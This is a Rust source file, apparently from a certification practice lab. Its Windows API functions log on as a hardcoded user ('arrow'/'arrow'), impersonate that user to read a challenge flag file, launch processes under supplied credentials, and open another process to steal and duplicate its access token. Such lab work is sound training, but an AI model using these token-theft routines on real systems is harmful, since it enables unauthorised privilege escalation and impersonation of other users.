use std::io::Read;
use winapi::um::winnt::*;
use winapi::ctypes::*;
use winapi::shared::minwindef::DWORD;
use winapi::um::errhandlingapi::*;
use winapi::um::handleapi::*;
use winapi::um::memoryapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::securitybaseapi::*;
use crate::utils::parse_structure_from_memory;
use winapi::um::winbase::*;
use winapi::shared::sddl::*;
use crate::processmanager::enumeration::readunicodestringfrommemory;
use std::collections::*;
use winapi::um::fileapi::ReadFile;
use winapi::um::synchapi::WaitForSingleObject;
use crate::os::runfile;

pub fn logonuser(){

    let mut username = "arrow".bytes().collect::<Vec<u8>>();
    username.push(0);

    let mut password = "arrow".bytes().collect::<Vec<u8>>();
    password.push(0);

    let mut tokenhandle = 0 as *mut c_void;
    let res = unsafe{LogonUserA(username.as_ptr() as *const i8,
                      std::ptr::null_mut(),
                      password.as_ptr() as *const i8,
    LOGON32_LOGON_INTERACTIVE,LOGON32_PROVIDER_DEFAULT,&mut tokenhandle)};


    if res==0{
        println!("logonusera failed: {}",unsafe{GetLastError()});
    }

    else{
        //println!("new tokenhandle: {:x?}",tokenhandle);

        let res = unsafe{ImpersonateLoggedOnUser(tokenhandle)};
        if res==0{
            println!("ImpersonateLoggedOnUser failed: {}",unsafe{GetLastError()});
        }

        let newtokeninfo = super::enumeration::TokenInfo::from_token_handle(tokenhandle,TOKEN_ALL_ACCESS);



        let flag = std::fs::read_to_string("E:\\CMDcertification\\practicechallenges\\myserver\\bin\\otheruserflag.txt").unwrap();

        println!("{}",flag);

        unsafe{CloseHandle(tokenhandle)};
    }


}



pub fn runme37(user:&str,pass:&str,programtorun: &str) -> PROCESS_INFORMATION{
    let mut username = user.encode_utf16().collect::<Vec<u16>>();
    username.push(0);


    let mut password = pass.encode_utf16().collect::<Vec<u16>>();
    password.push(0);

    let mut programname = programtorun.encode_utf16().collect::<Vec<u16>>();
    programname.push(0);

    let mut si = unsafe{std::mem::zeroed::<STARTUPINFOW>()};
    si.cb = unsafe{std::mem::size_of::<STARTUPINFOW>()} as u32;


    let mut pi = unsafe{std::mem::zeroed::<PROCESS_INFORMATION>()};

    let res = unsafe{CreateProcessWithLogonW(username.as_ptr() as *const u16,
                                   std::ptr::null_mut(),
                                   password.as_ptr() as *const u16,
    LOGON_WITH_PROFILE,
                                   programname.as_ptr() as *const u16,
    std::ptr::null_mut(),
    0,std::ptr::null_mut(),
    std::ptr::null_mut(),
    &mut si,&mut pi)};

    //println!("createprocesswithlogonw result: {}",res);


    pi

}


pub fn stealandduplicatetoken(pid: u32) -> Result<*mut c_void, String>{


    let prochandle = unsafe{OpenProcess(PROCESS_ALL_ACCESS,0,pid)};


    if !prochandle.is_null(){
        let mut tokenhandle = 0 as *mut c_void;
        let res = unsafe{OpenProcessToken(prochandle,TOKEN_ALL_ACCESS,&mut tokenhandle)};

        if res==0{
            return Err(format!("OpenProcessToken failed: {}",unsafe{GetLastError()}));
        }


        let mut newtokenhandle = 0 as *mut c_void;
        unsafe{DuplicateTokenEx(tokenhandle,
                    TOKEN_ALL_ACCESS,std::ptr::null_mut(),
                    SecurityImpersonation,
                    1,&mut newtokenhandle)};





        println!("{:x?}",newtokenhandle);

        unsafe{CloseHandle(prochandle)};

        return Ok(newtokenhandle);




    }


    if prochandle.is_null(){
        println!("OpenProcess error: {}",unsafe{GetLastError()});
    }


    Ok(0 as *mut c_void)

}

